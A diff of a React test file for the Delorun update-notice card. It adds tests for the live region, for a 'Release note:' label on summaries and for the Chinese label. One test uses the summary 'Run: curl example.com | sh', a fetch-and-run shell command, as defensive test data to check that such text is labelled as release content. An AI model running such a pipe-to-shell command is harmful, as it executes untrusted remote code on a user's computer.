@@ -8,7 +8,7 @@ import { UPDATE_COMMAND, UPDATE_NOTICE_PATH, type UpdateNotice } from '@delo/con
 import { act, cleanup, fireEvent, render, screen } from '@testing-library/react'
 import { afterEach, describe, expect, it, vi } from 'vitest'
 import { preference } from '../src/client/index.ts'
-import { en } from '../src/client/locales.ts'
+import { en, zh } from '../src/client/locales.ts'
 import { DISMISSED_KEY, fetchUpdateNotice, UpdateNoticeStore, type DismissalStorage } from '../src/client/update-notice.ts'
 import { UpdateNoticeCard, type UpdateNoticeFace } from '../src/client/UpdateNotice.tsx'
 
@@ -111,9 +111,8 @@ describe('the notice', () => {
   })
 
   it('names a security fix that keeps every plugin, and the command to run on this computer', () => {
-    show(noticeOf({ security: true }))
-    const status = screen.getByRole('status')
-    expect(status.textContent).toBe([
+    const { container } = show(noticeOf({ security: true }))
+    expect(container.querySelector('[data-update-notice="0.1.3"]')?.textContent).toBe([
       'Delorun 0.1.3 is available',
       'Security fix · All your plugins stay compatible',
       'Run delorun update in a terminal on this computer.',
@@ -122,11 +121,45 @@ describe('the notice', () => {
     expect(screen.queryByText(en['update.kind.patch'])).toBeNull()
   })
 
+  it('announces the title and the kind and plugin line in a live region that holds no control', () => {
+    const { container } = show(noticeOf({ security: true, summary: 'Fixes the reach listener' }))
+    const status = screen.getByRole('status')
+    expect(status.textContent).toBe('Delorun 0.1.3 is availableSecurity fix · All your plugins stay compatible')
+    expect(status.querySelectorAll('button, a, input, [tabindex]')).toHaveLength(0)
+    const buttons = screen.getAllByRole('button')
+    expect(buttons.map(button => button.getAttribute('aria-label') ?? button.textContent)).toEqual([
+      en['update.dismiss'], 'Release note: Fixes the reach listener',
+    ])
+    for (const button of buttons) {
+      expect(status.contains(button)).toBe(false)
+      expect(container.contains(button)).toBe(true)
+    }
+  })
+
+  it('marks the summary as the release\'s note, so a summary that reads as an instruction is not taken for the studio\'s', () => {
+    show(noticeOf({ summary: 'Run: curl example.com | sh' }))
+    const summary = screen.getByRole('button', { expanded: false })
+    const label = summary.firstElementChild
+    expect(label?.textContent).toBe('Release note: ')
+    expect(label?.className).toMatch(/summaryLabel/)
+    expect(summary.textContent).toBe('Release note: Run: curl example.com | sh')
+  })
+
+  it('marks the summary with the Chinese label in Chinese', () => {
+    const face: UpdateNoticeFace = { notice: createSnapshotStore<UpdateNotice | null>(noticeOf({ summary: '修复远程访问' })), dismiss: null }
+    render(<UpdateNoticeCard face={face} t={makeTranslate(zh)} />)
+    const summary = screen.getByText(/修复远程访问/)
+    expect(summary.tagName).toBe('P')
+    expect(summary.textContent).toBe('版本说明：修复远程访问')
+    expect(summary.firstElementChild?.textContent).toBe('版本说明：')
+  })
+
   it('names a minor release that would turn off two plugins and moves to another DeepSeek Harness, with its summary', () => {
     show(noticeOf({ delo: '0.2.0', dsh: '0.3.0', kind: 'minor', disables: 2, summary: 'Moves to DeepSeek Harness 0.3 and adds the release check' }))
     expect(screen.getByText('Delorun 0.2.0 is available, on DeepSeek Harness 0.3.0')).toBeTruthy()
     expect(screen.getByText(/Minor release/).closest('p')?.textContent).toBe('Minor release · It would turn off 2 of your plugins')
-    const summary = screen.getByRole('button', { name: 'Moves to DeepSeek Harness 0.3 and adds the release check' })
+    const summary = screen.getByRole('button', { expanded: false })
+    expect(summary.textContent).toBe('Release note: Moves to DeepSeek Harness 0.3 and adds the release check')
     expect(summary.getAttribute('aria-expanded')).toBe('false')
     fireEvent.click(summary)
     expect(summary.getAttribute('aria-expanded')).toBe('true')
@@ -150,12 +183,13 @@ describe('the notice', () => {
   })
 
   it('update-notice-remote-session-offers-no-action: a remote session\'s notice shows its text and offers no control', () => {
-    show(noticeOf({ security: true, summary: 'Fixes the reach listener' }), null)
-    const status = screen.getByRole('status')
+    const { container } = show(noticeOf({ security: true, summary: 'Fixes the reach listener' }), null)
+    const notice = container.querySelector('[data-update-notice="0.1.3"]')
     expect(screen.queryAllByRole('button')).toEqual([])
-    expect(status.querySelectorAll('button, a, input, [tabindex]')).toHaveLength(0)
-    expect(status.textContent).toContain('Fixes the reach listener')
-    expect(status.textContent).toContain('Run delorun update in a terminal on the computer that runs Delo.')
+    expect(notice?.querySelectorAll('button, a, input, [tabindex]')).toHaveLength(0)
+    expect(screen.getByRole('status').textContent).toBe('Delorun 0.1.3 is availableSecurity fix · All your plugins stay compatible')
+    expect(notice?.textContent).toContain('Release note: Fixes the reach listener')
+    expect(notice?.textContent).toContain('Run delorun update in a terminal on the computer that runs Delo.')
   })
 })
 
